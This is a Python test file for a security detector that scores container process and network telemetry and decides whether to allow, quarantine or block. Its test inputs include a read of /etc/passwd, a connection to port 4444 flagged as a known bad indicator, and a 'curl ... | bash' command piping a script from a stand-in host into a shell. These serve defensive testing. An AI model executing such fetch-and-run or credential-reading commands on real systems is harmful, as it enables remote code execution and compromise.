from app.detector import RiskEngine
from app.models import TelemetryEvent
from app.policy import PolicyEngine


def event(**kw):
    base = dict(
        event_id="e1",
        event_type="process",
        tetragon_event_type="process_exec",
        exec_id="exec-1",
        binary="/usr/bin/ls",
        args="-la /tmp",
        uid=0,
        username="root",
        parent_binary="/bin/bash",
        cluster_name="security-demo",
        namespace="default",
        pod_name="security-demo",
        kernel_activity=["execve"],
    )
    base.update(kw)
    return TelemetryEvent(**base)


def test_ls_as_root_stays_low_allow():
    e = event()
    risk, factors, reasons = RiskEngine().score(e)
    d = PolicyEngine().decide(e, risk)
    assert risk <= 0.10
    assert d.severity == "low"
    assert d.action == "allow"


def test_cat_passwd_is_contextual_not_critical():
    e = event(binary="/usr/bin/cat", args="/etc/passwd")
    risk, factors, reasons = RiskEngine().score(e)
    d = PolicyEngine().decide(e, risk)
    assert 0.20 <= risk < 0.35
    assert d.severity == "low"
    assert d.action == "allow"
    assert any(f.code == "SENSITIVE_PATH" for f in factors)


def test_curl_https_as_root_is_low_until_stronger_evidence():
    e = event(
        binary="/usr/bin/curl",
        args="-I https://hackveda.in",
        destination_host="hackveda.in",
        destination_port=443,
        kernel_activity=["execve"],
    )
    risk, factors, reasons = RiskEngine().score(e)
    d = PolicyEngine().decide(e, risk)
    assert risk < 0.35
    assert d.severity == "low"
    assert d.action == "allow"


def test_known_ioc_becomes_critical_block():
    e = event(
        event_type="network",
        tetragon_event_type="process_kprobe",
        binary="/usr/bin/curl",
        destination_ip="8.8.8.8",
        destination_port=4444,
        known_bad_ioc=True,
        kernel_activity=["connect"],
    )
    risk, factors, reasons = RiskEngine().score(e)
    d = PolicyEngine().decide(e, risk)
    assert risk >= 0.90
    assert d.severity == "critical"
    assert d.action == "block"
    assert d.approval_required


def test_download_to_shell_is_escalated():
    e = event(
        binary="/bin/bash",
        args="-c 'curl http://example.invalid/a.sh | bash'",
        parent_binary="/usr/sbin/nginx",
    )
    risk, factors, reasons = RiskEngine().score(e)
    d = PolicyEngine().decide(e, risk)
    assert risk >= 0.65
    assert d.action in {"quarantine", "block"}
